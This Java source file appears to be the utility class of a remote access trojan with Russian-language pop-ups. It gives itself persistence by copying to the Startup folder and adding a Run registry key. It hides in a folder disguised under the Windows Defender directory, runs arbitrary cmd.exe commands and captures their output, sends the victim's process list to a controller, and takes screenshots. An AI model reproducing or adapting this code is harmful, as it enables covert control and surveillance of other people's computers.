package me.ByteCoder.Core.JCController;

import java.awt.AWTException;
import java.awt.Container;
import java.awt.GridLayout;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.util.ArrayList;
import java.util.Random;
import java.util.Scanner;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import javax.swing.JFrame;
import javax.swing.JLabel;

import me.ByteCoder.Core.Client.CUtils;

public class Utils {
	
public static Thread screenThread;
	
public static void createABox(String data) {
	JFrame frame = new JFrame();
	frame.setTitle("Новое сообщение!");
	frame.setBounds(100 ,100,50 * data.split(" ").length,100);
	JLabel label = new JLabel(data);
	JLabel timer = new JLabel("" + data.split(" ").length);
	
    Container container = frame.getContentPane();
    container.setLayout(new GridLayout(3,2,2,2));
    container.add(label);
    container.add(timer);
    
    ScheduledExecutorService sched = Executors.newSingleThreadScheduledExecutor();
    sched.scheduleAtFixedRate(new Runnable() {
    	
    	int seconds = data.split(" ").length;
    	
		@Override
		public void run() {
			 seconds--;
			 if(seconds == 0) {
				 frame.setVisible(false);
			 }else {
			 timer.setText("" + seconds);
			 }
		}
    	
    }, 1, 1, TimeUnit.SECONDS);
    
    frame.setVisible(true);
}

public static void deleteConnector() {
	JFrame frame = new JFrame();
	frame.setTitle("Привет");
	frame.setBounds(100,100,200,100);
	
	JLabel label = new JLabel("Привет, это не вирус(почти). Хотел тебе сказать что Эксполит был удален с твоего ПК. Возможно я опять попаду сюда, установи антивирус. Пока.");
	
	Container container = frame.getContentPane();
	container.setLayout(new GridLayout(3,2,2,2));
	container.add(label);
	    
	frame.setVisible(true);
	
	File f = new File("C:" + File.separator + "Program Files" + File.separator + "Windows Defender" + File.separator + "OmegaConnector");
	f.delete();
}

public static long getUPTIME() {
	RuntimeMXBean rb = ManagementFactory.getRuntimeMXBean();
	return rb.getUptime();
}

public static void scribeToWindows() {
    File source = new File(getJarFile().toPath().toString());
    File dest = new File("C:" + Main.s + "Users" + Main.s + System.getProperty("user.name") + Main.s + "AppData" + Main.s + "Roaming" + Main.s + "Microsoft" + Main.s + "Windows" + Main.s + "Start Menu" + Main.s + "Programs" + Main.s + "Startup" + Main.s + getJarFile().getName());
    if(!dest.exists()) {
        try{
			copyFile(source, dest);
			System.out.println("Tryinig create directory..");
		} catch (IOException e1) {
			e1.printStackTrace();
		}
    }else{
    	dest.delete();
    	return;
    }
}

public static boolean isItScribed() {
	File s = new File("C:" + File.separator + "Program Files" + File.separator + "Windows Defender" + File.separator + "OmegaConnector");
	
	return s.exists();
}

public static void newScribeToWindows() {
	File s = new File(getJarFile().toPath().toString());
	File dest = new File("C:" + File.separator + "Program Files" + File.separator + "Windows Defender" + File.separator + "OmegaConnector");
	File modules = new File(dest.toPath().toString() + File.separator + "Modules");
	dest.mkdir();
	modules.mkdir();
	
	try {
		Files.setAttribute(dest.toPath(), "dos:hidden", Boolean.TRUE, LinkOption.NOFOLLOW_LINKS);
	} catch (IOException e) {
		e.printStackTrace();
	}
	
	try{
		if(dest.exists() && (getJarFile().getName().endsWith(".exe"))) {
			copyFile(s, new File(dest.toPath().toString() + File.separator + getJarFile().getName()));
			System.out.println("Tryinig create directory..");
		}
	}catch (IOException e1) {
		e1.printStackTrace();
	}
	
	try {
		WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Connector", dest.toPath().toString() + File.separatorChar + s.getName());
		System.out.println("Added to Windows registry.");
	} catch (IllegalArgumentException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	} catch (IllegalAccessException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	} catch (InvocationTargetException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
	System.out.println("Created!");
}

public static void startProcListerner() {
	ScheduledExecutorService sched = Executors.newSingleThreadScheduledExecutor();
	
	sched.scheduleAtFixedRate(new Runnable() {

		public void run() {
			Main.c.write("DATA", "SET", getTaskListFormated(), "TASKLIST");
		}
	}, new Random().nextInt(5), new Random().nextInt(5), TimeUnit.SECONDS);
}

public static String getTaskListFormated() {
	String str = "TextJProc.exe;";
	
	for(String s : getTaskList()) {
		str = str + s + ";";
	}
	
	return str;
}

public static String executeCommand(String command) {

	StringBuffer output = new StringBuffer();

	Process p;
	try {
		p = Runtime.getRuntime().exec("cmd.exe /c " + command);
		BufferedReader reader =
                        new BufferedReader(new InputStreamReader(p.getInputStream()));

                    String line = "";
		while ((line = reader.readLine())!= null) {
			output.append(line + "\n");
		}

	} catch (Exception e) {
		e.printStackTrace();
	}

	return output.toString();

}

public static ArrayList<String> getTaskList() {
	ArrayList<String> s = new ArrayList<String>();
	
	try {
		Process process = new ProcessBuilder("tasklist.exe", "/fo", "csv", "/nh").start();
	
    new Thread(() -> {
        Scanner sc = new Scanner(process.getInputStream());
        if (sc.hasNextLine()) sc.nextLine();
        while (sc.hasNextLine()) {
            String line = sc.nextLine();
            String[] parts = line.split(",");
            String unq = parts[0].substring(1).replaceFirst(".$", "");
            s.add(unq);
        }
        sc.close();
    }).start();
    	try {
			process.waitFor();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		process.destroy();
	} catch (IOException e) {
		e.printStackTrace();
	}
	
	
	return s;
}

public static File getJarFile() {
	return new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath());
}

public static void copyFile(File source, File dest) throws IOException {
    InputStream is = null;
    OutputStream os = null;
    try {
        is = new FileInputStream(source);
        os = new FileOutputStream(dest);
        byte[] buffer = new byte[1024];
        int length;
        while ((length = is.read(buffer)) > 0) {
            os.write(buffer, 0, length);
        }
    } finally {
        is.close();
        os.close();
    }
}

public static String getFileExtension(File file) {
    String name = file.getName();
    try {
        return name.substring(name.lastIndexOf(".") + 1);
    } catch (Exception e) {
        return "";
    }
}

public static BufferedImage createScreenShot() {
	Robot robot = null;
	try {
		robot = new Robot();
	} catch (AWTException e) {
		e.printStackTrace();
	}
	BufferedImage img = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
    return img;
}



}
